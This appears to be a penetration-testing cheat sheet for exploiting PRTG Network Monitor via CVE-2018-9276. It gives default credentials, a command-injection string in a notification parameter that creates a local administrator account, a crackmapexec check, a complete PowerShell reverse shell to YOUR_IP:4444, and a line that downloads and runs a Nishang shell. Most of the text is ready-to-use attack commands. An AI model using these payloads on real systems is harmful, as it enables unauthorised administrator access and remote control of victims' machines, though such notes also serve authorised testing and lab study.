- Default Credentials: `prtgadmin:prtgadmin`, `prtgadmin:Password123`
- check version `curl -s http://<target>:8080/index.htm | grep "prtgversion"`


##  Exploitation (Authenticated RCE - CVE-2018-9276)

#### Step 1: 
- Login - Use default creds (prtgadmin:prtgadmin or bruteforce).

#### Step 2: Create Malicious Notificatio
- Navigate to: `Setup → Account Settings → Notifications → Add Notification`
- Configure:
    - Name: Pwned
    - Execute Program: Demo exe notification - outfile.ps1
    - Parameters:
        ```powershell
        test.txt;net user prtgadm Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm /add
        Click Test → Executes command.
        ```
- Click Test → Executes command.
#### Step 3: Verify Admin Access
```bash
crackmapexec smb <target_ip> -u prtgadm -p Pwn3d_by_PRTG!

# Expected Output:
[+] <target>\prtgadm:Pwn3d_by_PRTG! (Pwn3d!)
```

## Reverse Shell (Alternative to Adding User)
#### Method 1: PowerShell Reverse Shell
```PowerShell
test.txt;powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Method 2: Nishang Reverse Shell
- Upload `Invoke-PowerShellTcp.ps1
- Execute
```powershell
test.txt;powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IP YOUR_IP -Port 4444"
```

 
